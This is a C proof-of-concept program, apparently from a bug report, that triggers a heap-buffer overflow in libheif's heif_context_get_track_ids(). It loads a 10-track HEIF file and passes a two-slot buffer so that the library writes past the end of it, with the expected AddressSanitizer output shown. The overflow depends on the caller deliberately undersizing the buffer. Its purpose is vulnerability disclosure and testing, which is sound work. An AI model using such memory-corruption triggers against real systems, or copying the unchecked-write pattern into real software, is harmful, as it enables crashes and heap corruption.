/*
 * POC for Bug 07:
 * heif_context_get_track_ids() writes N uint32_t track IDs into a caller-supplied
 * array without any bounds/capacity check.  If the array is smaller than the
 * actual track count the function walks off the end of the heap allocation.
 *
 * Affected file : libheif/api/libheif/heif_sequences.cc:73
 * Affected API  : void heif_context_get_track_ids(const heif_context*, uint32_t[])
 *
 * Vulnerable code (heif_sequences.cc:67-79):
 *   void heif_context_get_track_ids(const heif_context* ctx, uint32_t out_track_id_array[])
 *   {
 *     std::vector<uint32_t> IDs;
 *     IDs = ctx->context->get_track_IDs();
 *     for (uint32_t id : IDs) {          // iterates ALL track IDs
 *       *out_track_id_array++ = id;       // no bounds check
 *     }
 *   }
 *
 * Strategy:
 *   1. Read poc07_10tracks.heif — a pre-built HEIF file containing 10 tracks.
 *   2. Verify heif_context_number_of_sequence_tracks() returns 10.
 *   3. Allocate a buffer for only 2 uint32_t slots (SMALL = 2).
 *   4. Call heif_context_get_track_ids() with the under-sized buffer.
 *      The loop iterates 10 times, writing 8 uint32_t values past the end
 *      of the 2-element heap allocation.
 *
 * Expected ASAN output:
 *   ERROR: AddressSanitizer: heap-buffer-overflow
 *   WRITE of size 4 at ...
 *   in heif_context_get_track_ids
 *
 * Build: see build.sh
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include "libheif/heif_context.h"
#include "libheif/heif_sequences.h"

int main(int argc, char* argv[])
{
    const char* heif_file = (argc > 1) ? argv[1] : "/tmp/poc07_10tracks.heif";

    // ---- Step 1: read the HEIF file -----------------------------------------
    heif_context* ctx = heif_context_alloc();
    heif_error err = heif_context_read_from_file(ctx, heif_file, nullptr);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "[poc07] heif_context_read_from_file('%s') failed: %s\n",
                heif_file, err.message);
        heif_context_free(ctx);
        return 1;
    }

    // ---- Step 2: verify real track count ------------------------------------
    int real_count = heif_context_number_of_sequence_tracks(ctx);
    fprintf(stderr, "[poc07] Real track count: %d\n", real_count);

    if (real_count < 3) {
        fprintf(stderr, "[poc07] Not enough tracks to demonstrate overflow (got %d)\n",
                real_count);
        heif_context_free(ctx);
        return 1;
    }

    // ---- Step 3: allocate a SMALL buffer (2 slots only) ---------------------
    // Intentionally much smaller than real_count (10).
    // ASAN allocates exactly 2 * sizeof(uint32_t) = 8 bytes.
    const int SMALL = 2;
    uint32_t* small_buf = (uint32_t*)malloc(SMALL * sizeof(uint32_t));
    if (!small_buf) { perror("malloc"); heif_context_free(ctx); return 1; }

    fprintf(stderr,
            "[poc07] Calling heif_context_get_track_ids() with buf[%d] "
            "but library reports %d tracks — OOB write by %d uint32_t words\n",
            SMALL, real_count, real_count - SMALL);

    // ---- Step 4: trigger the OOB write --------------------------------------
    // heif_sequences.cc:73-79 loops over IDs.size() (== 10) entries,
    // incrementing out_track_id_array unconditionally — no capacity check.
    heif_context_get_track_ids(ctx, small_buf);   // <-- OOB write here

    // Reached only without ASAN (non-instrumented build):
    fprintf(stderr, "[poc07] ids[0]=%u ids[1]=%u (heap is now corrupted)\n",
            small_buf[0], small_buf[1]);

    free(small_buf);
    heif_context_free(ctx);
    return 0;
}
